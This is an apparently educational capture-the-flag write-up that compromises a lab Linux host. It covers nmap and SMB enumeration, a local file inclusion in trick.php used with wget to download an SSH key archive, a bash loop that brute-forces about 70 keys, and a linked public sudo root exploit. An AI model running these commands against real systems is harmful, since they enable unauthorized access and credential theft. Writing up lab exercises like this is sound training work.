# **Silence**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/97b510aa-62b6-452a-870d-54a1b724d1c3)

## **Difficulty = Medium**
***

Running our nmap scan we have this -:


```bash
# Nmap 7.94 scan initiated Mon Nov 20 21:00:15 2023 as: nmap -sCV -p21,80,139,445,1055 -T4 -oN nmap.txt --min-rate=1000 -v 10.150.150.55
Nmap scan report for 10.150.150.55
Host is up (0.18s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.66.66.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Jun 12  2020 test
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
1055/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   UBUNTU<00>           Flags: <unique><active>
|   UBUNTU<03>           Flags: <unique><active>
|   UBUNTU<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-11-20T20:33:58
|_  start_date: N/A
|_clock-skew: 33m23s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 20 21:00:40 2023 -- 1 IP address (1 host up) scanned in 24.46 seconds
```



We truly do have anonymous access to the `FTP` protocol



![](https://i.imgur.com/dmWBMK7.png)


Enumerating this service we only have one file called `test`



![](https://i.imgur.com/HFJvuU1.png)




Concatenating the `test` file we have this message 😂


![](https://i.imgur.com/Y45xb3V.png)



Enumerating the protocol `SMB` we have 2 shares


![](https://i.imgur.com/rUtXEKe.png)



We don't have read access to the `IPC$` share, neither can we connect to the `print$` share


![](https://i.imgur.com/0QFbcR5.png)


Navigating to the `HTTP` protocol we have this default apache2 web page


![](https://i.imgur.com/CsjvOLR.png)


Viewing-page source doesn't  have any useful information so i decided to run a directory bruteforce using the tool `dirsearch`


![](https://i.imgur.com/OnWzgIw.png)

Navigating to `/info.php` we have this PHP info page which leads to nothing


![](https://i.imgur.com/x5FkFpi.png)



Navigating to `/index.php` gives us this file search site


![](https://i.imgur.com/R4Pef0L.png)



Fuzzing users with `enum4linux` also gave us this


![](https://i.imgur.com/T6YQeOV.png)


Enumerated all along and found out that we need to test out various parameter on the `/index.php` page, finally `?path=/` worked


![](https://i.imgur.com/ZeYboUl.png)


One thing i noticed is that all users `/home/users/.ssh` directory has a listing like `/var/www/html` and most of the files we found when doing directory bruteforce where here


![](https://i.imgur.com/WRJpaAm.png)


Navigating to `/var/www/html` we now have all files and directory we did not find using `dirsearch` here


![](https://i.imgur.com/oNtt3J8.png)



Navigating to `/trick.php?page=LFI_PAYLOAD`, we where able to get `LFI`

![](https://i.imgur.com/rmyd3uq.png)

So 2 parameters are valid which are `path` and `page`, Navigating back to our `/home` directory i found a backup file on user **sally's** home directory


![](https://i.imgur.com/BXfIG4C.png)



We can then go ahead and download the file using wget on `/trick.php` then decompress it

```bash
wget http://10.150.150.55/trick.php?page=/home/sally/backup/SSHArchiveBackup.tar.gz
```


![](https://i.imgur.com/9AE17Px.png)


Navigating to the `private` folder we decompressed, we have this huge list of `id_rsa` files


![](https://i.imgur.com/RTvvDJW.png)


Well we can use a **for loop** in bash to make connections through all of this `id_rsa` files, and then when it finds one, it logs in automatically


```bash
$ chmod 600 id_rsa*
$ for key in ./id_rsa*; do ssh -o BatchMode=yes -i "$key" sally@10.150.150.55 -p 1055 || true; done
```

We got shell as user `sally` after all, 70th attempt 🥱

```bash
 $ ssh -i id_rsa70 sally@10.150.150.55 -p 1055
```


![](https://i.imgur.com/HjnHTNl.png)


> In this command, the `-o BatchMode=yes` option tells `ssh` to operate in batch mode, meaning it won't prompt for passwords or passphrases. The `|| true` at the end ensures that the loop continues even if the `ssh` command fails (for example, if the key is not valid). It prevents the loop from stopping prematurely due to a failed `ssh` command.

## **Privilege Escalation**

Checking the version of `sudo`, we have an outdated sudo version vulnerable to 


![](https://i.imgur.com/gfQADE7.png)


We can get an exploit from [here](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main) and transfer it to user **sally's** home folder since `/tmp` does not allow us to execute binaries


![](https://i.imgur.com/MEiDwAz.png)



Run the following command to get user **root**

```bash
$ make
$ ./exploit
```


![](https://i.imgur.com/suLM00m.png)


## **Things i Learnt**

- Always try out different parameters on URL if nothing shows up on enumeration
- Look deeper, it is not always about "**lateral movement**" (I thought we would switch to users since we have multiple users, but it turned out the other way around 😂)


That will be all for today, Have a nice week 👨‍💻



![](https://i.pinimg.com/originals/79/7f/34/797f347cc1b437839cd21b44aa6fde96.gif)



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>




